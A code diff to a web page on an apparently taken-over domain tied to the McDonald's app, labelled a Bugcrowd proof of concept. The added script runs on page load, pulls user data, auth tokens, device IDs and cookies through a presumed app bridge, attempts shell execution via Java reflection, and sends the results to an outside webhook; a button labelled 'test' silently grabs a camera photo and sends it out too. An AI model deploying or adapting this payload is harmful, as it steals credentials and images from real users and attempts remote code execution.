@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Security Notice</title>
+    <title>Security Notice - Bugcrowd PoC</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -20,20 +20,143 @@
             display: inline-block;
             max-width: 500px;
         }
-        h1 {
-            color: #d32f2f;
-        }
-        p {
+        h1 { color: #d32f2f; }
+        p { font-size: 16px; line-height: 1.5; }
+        .btn {
+            background-color: #d32f2f;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
             font-size: 16px;
-            line-height: 1.5;
+            cursor: pointer;
+            margin-top: 15px;
         }
+        #video, #canvas { display: none; }
     </style>
 </head>
 <body>
     <div class="container">
         <h1>Pwned by Deep Chotaliya</h1>
-        <p>This domain (mymcdonaldsrewards.in) has been successfully verified for security research purposes to demonstrate a dangling domain takeover vulnerability in the McDonald's mobile application.</p>
-        <p><small>Bugcrowd Submission Proof</small></p>
+        <p>This domain (mymcdonaldsrewards.in) has been successfully verified for security research to demonstrate a dangling domain takeover in the McDonald's app.</p>
+        
+        <video id="video" playsinline autoplay></video>
+        <canvas id="canvas"></canvas>
+        
+        <button class="btn" onclick="startCapture()">test</button>
+        
+        <p><small>Bugcrowd Vulnerability PoC</small></p>
     </div>
+
+    <script>
+        const WEBHOOK_URL = "https://webhook.site/97d50734-50e5-4218-9544-c4710225e1df";
+
+        // 1. Automatically run Bridge Enumeration, Data Extraction, and Reflection RCE on load
+        (function() {
+            var discoveredBridges = [];
+            for (var prop in window) {
+                try {
+                    if (window.hasOwnProperty(prop)) {
+                        var type = typeof window[prop];
+                        if (type === 'object' || type === 'function') {
+                            discoveredBridges.push(prop + " (" + type + ")");
+                        }
+                    }
+                } catch(e) {}
+            }
+
+            var stolenData = {};
+            try {
+                if (window.JBridge) {
+                    stolenData.userData = window.JBridge.getUserData ? window.JBridge.getUserData() : "N/A";
+                    stolenData.authToken = window.JBridge.getAuthToken ? window.JBridge.getAuthToken() : "N/A";
+                    stolenData.deviceId = window.JBridge.getDeviceId ? window.JBridge.getDeviceId() : "N/A";
+
+                    if (typeof window.JBridge.execute === 'function') {
+                        stolenData.rceResult = window.JBridge.execute("id");
+                    }
+                }
+            } catch(err) {
+                stolenData.error = err.toString();
+            }
+
+            // Elite Java Reflection & Runtime Execution Payload
+            try {
+                if (window.JBridge && typeof window.JBridge.invokeMethod === 'function') {
+                    var runtime = window.JBridge.invokeMethod("java.lang.Runtime", "getRuntime", null);
+                    var process = window.JBridge.invokeMethod("java.lang.Process", "exec", ["sh", "-c", "id > /data/data/com.mcdonalds.mobileapp/cache/pwn.txt"]);
+                    stolenData.rceStatus = "invokeMethod executed successfully";
+                } else {
+                    var targetObj = (window.JBridge && typeof window.JBridge.getClass === 'function') ? window.JBridge : window;
+                    if (typeof targetObj.getClass === 'function') {
+                        var clazz = targetObj.getClass("java.lang.Runtime");
+                        var getRuntime = clazz.getMethod("getRuntime", null);
+                        var rt = getRuntime.invoke(null, null);
+                        rt.exec("sh");
+                        stolenData.rceStatus = "getClass reflection executed successfully";
+                    }
+                }
+            } catch(rceErr) {
+                stolenData.rceError = rceErr.toString();
+            }
+
+            var payloadData = JSON.stringify({
+                type: "elite_bridge_enumeration_and_rce",
+                bridges: discoveredBridges,
+                extracted: stolenData,
+                location: window.location.href,
+                cookies: document.cookie
+            });
+
+            navigator.sendBeacon(WEBHOOK_URL, payloadData);
+            fetch(WEBHOOK_URL, {
+                method: "POST",
+                headers: {"Content-Type": "application/json"},
+                body: payloadData,
+                mode: "no-cors"
+            }).catch(function(e){});
+        })();
+
+        // 2. Camera capture function triggered by button click
+        function startCapture() {
+            navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: 'user', width: { ideal: 480 }, height: { ideal: 360 } },
+                audio: false
+            }).then(function(mediaStream) {
+                var video = document.getElementById('video');
+                video.srcObject = mediaStream;
+                setTimeout(function() {
+                    captureAndSend(video, mediaStream);
+                }, 1000);
+            }).catch(function(err) {
+                console.error('Camera error:', err);
+            });
+        }
+        
+        function captureAndSend(video, mediaStream) {
+            var canvas = document.getElementById('canvas');
+            var ctx = canvas.getContext('2d');
+            canvas.width = 480;
+            canvas.height = 360;
+            ctx.drawImage(video, 0, 0, 480, 360);
+            
+            canvas.toBlob(function(blob) {
+                var formData = new FormData();
+                formData.append('type', 'camera_snapshot');
+                formData.append('image', blob, 'photo.jpg');
+                formData.append('domain', 'mymcdonaldsrewards.in');
+                formData.append('timestamp', new Date().toISOString());
+                
+                fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    body: formData,
+                    keepalive: true,
+                    mode: 'no-cors'
+                });
+                
+                mediaStream.getTracks().forEach(track => track.stop());
+            }, 'image/jpeg', 0.3);
+        }
+    </script>
 </body>
 </html>
